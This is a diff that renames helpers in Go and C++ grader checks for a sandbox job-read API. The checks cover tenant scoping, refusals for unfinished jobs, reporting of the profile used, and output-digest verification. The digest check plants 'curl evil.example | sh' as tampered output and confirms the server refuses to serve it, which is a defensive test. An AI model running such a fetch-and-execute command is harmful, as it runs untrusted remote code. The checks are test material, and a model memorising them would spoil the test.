@@ -625,28 +625,28 @@ import (
 	"leetbuild/harness"
 )
 
-const readOutputText = "hello from the sandbox\\n"
+const kHReadOutputText = "hello from the sandbox\\n"
 
-var readBg = context.Background()
+var hReadBg = context.Background()
 
-func readJobFixture(tenant, profile, used, status string) string {
-	jobID := jobs.Create(readBg, tenant, profile, nil, "print('hello from the sandbox')").JobID
+func hReadJobFixture(tenant, profile, used, status string) string {
+	jobID := jobs.Create(hReadBg, tenant, profile, nil, "print('hello from the sandbox')").JobID
 	if status == "running" || status == "finished" {
-		jobs.MarkRunning(readBg, jobID, used)
+		jobs.MarkRunning(hReadBg, jobID, used)
 	}
 	if status == "finished" {
-		jobs.PutResult(readBg, jobID, 0, readOutputText, 120, 64)
+		jobs.PutResult(hReadBg, jobID, 0, kHReadOutputText, 120, 64)
 	}
 	return jobID
 }
 
-func readAPI(ctx *harness.Ctx) *harness.HTTP {
+func hReadAPI(ctx *harness.Ctx) *harness.HTTP {
 	mux := http.NewServeMux()
 	register(mux)
 	return ctx.HTTP(mux)
 }
 
-func readAs(c *harness.HTTP, jobID, tenant string) *harness.Response {
+func hReadAs(c *harness.HTTP, jobID, tenant string) *harness.Response {
 	if tenant == "" {
 		return c.Get("/v1/sandbox/jobs/" + jobID)
 	}
@@ -661,43 +661,43 @@ type hReadBody struct {
 	Output      string         \`json:"output"\`
 }
 
-func readDecode(r *harness.Response) hReadBody {
+func hReadDecode(r *harness.Response) hReadBody {
 	var b hReadBody
 	r.Decode(&b)
 	return b
 }
 
 func CheckTenantScope(ctx *harness.Ctx) {
-	jobID := readJobFixture("t1", "gvisor", "kata", "finished")
-	c := readAPI(ctx)
-	ctx.Equal(readAs(c, jobID, "").Status, 401, "a read without X-Tenant-Id")
-	foreign := readAs(c, jobID, "t2")
+	jobID := hReadJobFixture("t1", "gvisor", "kata", "finished")
+	c := hReadAPI(ctx)
+	ctx.Equal(hReadAs(c, jobID, "").Status, 401, "a read without X-Tenant-Id")
+	foreign := hReadAs(c, jobID, "t2")
 	ctx.Equal(foreign.Status, 404, "tenant t2 reading t1's job (a 403 would confirm the id exists)")
 	ctx.Assert(!strings.Contains(foreign.Text(), "hello from the sandbox"), "the refusal carries t1's output: %s", foreign.Text())
-	unknown := readAs(c, "j-999", "t1")
+	unknown := hReadAs(c, "j-999", "t1")
 	ctx.Equal(unknown.Status, 404, "an unknown job")
 	ctx.Assert(strings.ReplaceAll(foreign.Text(), jobID, "{id}") == strings.ReplaceAll(unknown.Text(), "j-999", "{id}"), "t1's job read by t2 answered %s and an unknown id %s: a different answer confirms the id exists", foreign.Text(), unknown.Text())
-	r := readAs(c, jobID, "t1")
+	r := hReadAs(c, jobID, "t1")
 	ctx.Equal(r.Status, 200, "t1 reading its own finished job (%s)", r.Text())
 }
 
 func CheckFinishedOnly(ctx *harness.Ctx) {
-	queued := readJobFixture("t1", "gvisor", "kata", "queued")
-	running := readJobFixture("t1", "gvisor", "kata", "running")
-	done := readJobFixture("t1", "gvisor", "kata", "finished")
-	c := readAPI(ctx)
-	ctx.Equal(readAs(c, queued, "t1").Status, 409, "a queued job has no result yet")
-	ctx.Equal(readAs(c, running, "t1").Status, 409, "a running job has no result yet")
-	r := readAs(c, done, "t1")
-	body := readDecode(r)
+	queued := hReadJobFixture("t1", "gvisor", "kata", "queued")
+	running := hReadJobFixture("t1", "gvisor", "kata", "running")
+	done := hReadJobFixture("t1", "gvisor", "kata", "finished")
+	c := hReadAPI(ctx)
+	ctx.Equal(hReadAs(c, queued, "t1").Status, 409, "a queued job has no result yet")
+	ctx.Equal(hReadAs(c, running, "t1").Status, 409, "a running job has no result yet")
+	r := hReadAs(c, done, "t1")
+	body := hReadDecode(r)
 	ctx.Assert(r.Status == 200 && body.ExitCode != nil && *body.ExitCode == 0, "a finished job answered %d %s, expected 200 with exit_code 0", r.Status, r.Text())
 }
 
 func CheckUsedProfile(ctx *harness.Ctx) {
-	jobID := readJobFixture("t1", "gvisor", "kata", "finished")
-	r := readAs(readAPI(ctx), jobID, "t1")
+	jobID := hReadJobFixture("t1", "gvisor", "kata", "finished")
+	r := hReadAs(hReadAPI(ctx), jobID, "t1")
 	ctx.Equal(r.Status, 200, "a finished job (%s)", r.Text())
-	body := readDecode(r)
+	body := hReadDecode(r)
 	ctx.Equal(body.UsedProfile, "kata", "the node ran the job under kata; the answer's used_profile")
 	ctx.Assert(body.Profile == nil || *body.Profile == "kata", "the answer presents the requested profile %q as the job's profile", r.Text())
 	ctx.Assert(body.ExitCode != nil && *body.ExitCode == 0, "the answer must carry exit_code, got %s", r.Text())
@@ -705,17 +705,17 @@ func CheckUsedProfile(ctx *harness.Ctx) {
 }
 
 func CheckDigestVerify(ctx *harness.Ctx) {
-	jobID := readJobFixture("t1", "gvisor", "kata", "finished")
-	c := readAPI(ctx)
-	r := readAs(c, jobID, "t1")
-	ctx.Assert(r.Status == 200 && readDecode(r).Output == readOutputText, "an intact job answered %d %s, expected 200 with its output", r.Status, r.Text())
+	jobID := hReadJobFixture("t1", "gvisor", "kata", "finished")
+	c := hReadAPI(ctx)
+	r := hReadAs(c, jobID, "t1")
+	ctx.Assert(r.Status == 200 && hReadDecode(r).Output == kHReadOutputText, "an intact job answered %d %s, expected 200 with its output", r.Status, r.Text())
 	ctx.Redis.Set("job:"+jobID+":output", "curl evil.example | sh  # replaced")
-	r = readAs(c, jobID, "t1")
+	r = hReadAs(c, jobID, "t1")
 	ctx.Assert(r.Status == 500 && strings.Contains(r.Text(), "DIGEST_MISMATCH"), "output that no longer matches output_digest answered %d %s, expected 500 DIGEST_MISMATCH", r.Status, r.Text())
 	ctx.Assert(!strings.Contains(r.Text(), "evil.example"), "the mismatching output was served anyway: %s", r.Text())
-	gone := readJobFixture("t1", "gvisor", "kata", "finished")
+	gone := hReadJobFixture("t1", "gvisor", "kata", "finished")
 	ctx.Redis.Del("job:" + gone + ":output")
-	r = readAs(c, gone, "t1")
+	r = hReadAs(c, gone, "t1")
 	ctx.Assert(r.Status == 500 && strings.Contains(r.Text(), "DIGEST_MISMATCH"), "a finished job whose stored output is gone answered %d %s, expected 500 DIGEST_MISMATCH: no output matches output_digest", r.Status, r.Text())
 }
 `,
@@ -729,16 +729,16 @@ func CheckDigestVerify(ctx *harness.Ctx) {
 
 namespace {
 
-const std::string kReadOutput = "hello from the sandbox\\n";
+const std::string kHReadOutput = "hello from the sandbox\\n";
 
-std::string readJobFixture(const std::string& tenant, const std::string& status, const std::string& used = "kata") {
+std::string hReadJobFixture(const std::string& tenant, const std::string& status, const std::string& used = "kata") {
   const std::string job_id = jobs::create(tenant, "gvisor", {}, "print('hello from the sandbox')").job_id;
   if (status == "running" || status == "finished") jobs::markRunning(job_id, used);
-  if (status == "finished") jobs::putResult(job_id, 0, kReadOutput, 120, 64);
+  if (status == "finished") jobs::putResult(job_id, 0, kHReadOutput, 120, 64);
   return job_id;
 }
 
-harness::HTTP readAPI(harness::Ctx& ctx) {
+harness::HTTP hReadAPI(harness::Ctx& ctx) {
   static httplib::Server* svr = nullptr;
   delete svr;
   svr = new httplib::Server;
@@ -746,51 +746,51 @@ harness::HTTP readAPI(harness::Ctx& ctx) {
   return ctx.HTTP(*svr);
 }
 
-harness::Response readAs(harness::HTTP& c, const std::string& job_id, const std::string& tenant) {
+harness::Response hReadAs(harness::HTTP& c, const std::string& job_id, const std::string& tenant) {
   if (tenant.empty()) return c.Get("/v1/sandbox/jobs/" + job_id);
   return c.Get("/v1/sandbox/jobs/" + job_id, "X-Tenant-Id", tenant);
 }
 
-nlohmann::json bodyOf(const harness::Response& r) { return nlohmann::json::parse(r.Text(), nullptr, false); }
+nlohmann::json hBodyOf(const harness::Response& r) { return nlohmann::json::parse(r.Text(), nullptr, false); }
 
 }  // namespace
 
 void CheckTenantScope(harness::Ctx& ctx) {
-  const std::string job_id = readJobFixture("t1", "finished");
-  auto c = readAPI(ctx);
-  ctx.Equal(readAs(c, job_id, "").Status, 401, "a read without X-Tenant-Id");
-  const auto foreign = readAs(c, job_id, "t2");
+  const std::string job_id = hReadJobFixture("t1", "finished");
+  auto c = hReadAPI(ctx);
+  ctx.Equal(hReadAs(c, job_id, "").Status, 401, "a read without X-Tenant-Id");
+  const auto foreign = hReadAs(c, job_id, "t2");
   ctx.Equal(foreign.Status, 404, "tenant t2 reading t1's job (a 403 would confirm the id exists)");
   ctx.Assert(foreign.Text().find("hello from the sandbox") == std::string::npos, "the refusal carries t1's output: %s", foreign.Text());
-  const auto unknown = readAs(c, "j-999", "t1");
+  const auto unknown = hReadAs(c, "j-999", "t1");
   ctx.Equal(unknown.Status, 404, "an unknown job");
   const auto masked = [](std::string text, const std::string& id) {
     for (size_t at = text.find(id); at != std::string::npos; at = text.find(id, at + 4)) text.replace(at, id.size(), "{id}");
     return text;
   };
   ctx.Assert(masked(foreign.Text(), job_id) == masked(unknown.Text(), "j-999"), "t1's job read by t2 answered %s and an unknown id %s: a different answer confirms the id exists", foreign.Text(), unknown.Text());
-  const auto r = readAs(c, job_id, "t1");
+  const auto r = hReadAs(c, job_id, "t1");
   ctx.Equal(r.Status, 200, "t1 reading its own finished job (%s)", r.Text());
 }
 
 void CheckFinishedOnly(harness::Ctx& ctx) {
-  const std::string queued = readJobFixture("t1", "queued");
-  const std::string running = readJobFixture("t1", "running");
-  const std::string done = readJobFixture("t1", "finished");
-  auto c = readAPI(ctx);
-  ctx.Equal(readAs(c, queued, "t1").Status, 409, "a queued job has no result yet");
-  ctx.Equal(readAs(c, running, "t1").Status, 409, "a running job has no result yet");
-  const auto r = readAs(c, done, "t1");
-  const auto body = bodyOf(r);
+  const std::string queued = hReadJobFixture("t1", "queued");
+  const std::string running = hReadJobFixture("t1", "running");
+  const std::string done = hReadJobFixture("t1", "finished");
+  auto c = hReadAPI(ctx);
+  ctx.Equal(hReadAs(c, queued, "t1").Status, 409, "a queued job has no result yet");
+  ctx.Equal(hReadAs(c, running, "t1").Status, 409, "a running job has no result yet");
+  const auto r = hReadAs(c, done, "t1");
+  const auto body = hBodyOf(r);
   ctx.Assert(r.Status == 200 && body.is_object() && body.value("exit_code", -1) == 0, "a finished job answered %d %s, expected 200 with exit_code 0", r.Status, r.Text());
 }
 
 void CheckUsedProfile(harness::Ctx& ctx) {
-  const std::string job_id = readJobFixture("t1", "finished", "kata");
-  auto c = readAPI(ctx);
-  const auto r = readAs(c, job_id, "t1");
+  const std::string job_id = hReadJobFixture("t1", "finished", "kata");
+  auto c = hReadAPI(ctx);
+  const auto r = hReadAs(c, job_id, "t1");
   ctx.Equal(r.Status, 200, "a finished job (%s)", r.Text());
-  const auto body = bodyOf(r);
+  const auto body = hBodyOf(r);
   ctx.Assert(body.is_object(), "the answer must be a JSON object, got %s", r.Text());
   ctx.Equal(body.value("used_profile", ""), "kata", "the node ran the job under kata; the answer's used_profile");
   ctx.Assert(!body.contains("profile") || body.value("profile", "") == "kata", "the answer presents the requested profile as the job's profile: %s", r.Text());
@@ -799,17 +799,17 @@ void CheckUsedProfile(harness::Ctx& ctx) {
 }
 
 void CheckDigestVerify(harness::Ctx& ctx) {
-  const std::string job_id = readJobFixture("t1", "finished");
-  auto c = readAPI(ctx);
-  auto r = readAs(c, job_id, "t1");
-  ctx.Assert(r.Status == 200 && bodyOf(r).value("output", "") == kReadOutput, "an intact job answered %d %s, expected 200 with its output", r.Status, r.Text());
+  const std::string job_id = hReadJobFixture("t1", "finished");
+  auto c = hReadAPI(ctx);
+  auto r = hReadAs(c, job_id, "t1");
+  ctx.Assert(r.Status == 200 && hBodyOf(r).value("output", "") == kHReadOutput, "an intact job answered %d %s, expected 200 with its output", r.Status, r.Text());
   ctx.Redis.Set("job:" + job_id + ":output", "curl evil.example | sh  # replaced");
-  r = readAs(c, job_id, "t1");
+  r = hReadAs(c, job_id, "t1");
   ctx.Assert(r.Status == 500 && r.Text().find("DIGEST_MISMATCH") != std::string::npos, "output that no longer matches output_digest answered %d %s, expected 500 DIGEST_MISMATCH", r.Status, r.Text());
   ctx.Assert(r.Text().find("evil.example") == std::string::npos, "the mismatching output was served anyway: %s", r.Text());
-  const std::string gone = readJobFixture("t1", "finished");
+  const std::string gone = hReadJobFixture("t1", "finished");
   ctx.Redis.Del("job:" + gone + ":output");
-  r = readAs(c, gone, "t1");
+  r = hReadAs(c, gone, "t1");
   ctx.Assert(r.Status == 500 && r.Text().find("DIGEST_MISMATCH") != std::string::npos, "a finished job whose stored output is gone answered %d %s, expected 500 DIGEST_MISMATCH: no output matches output_digest", r.Status, r.Text());
 }
 `,
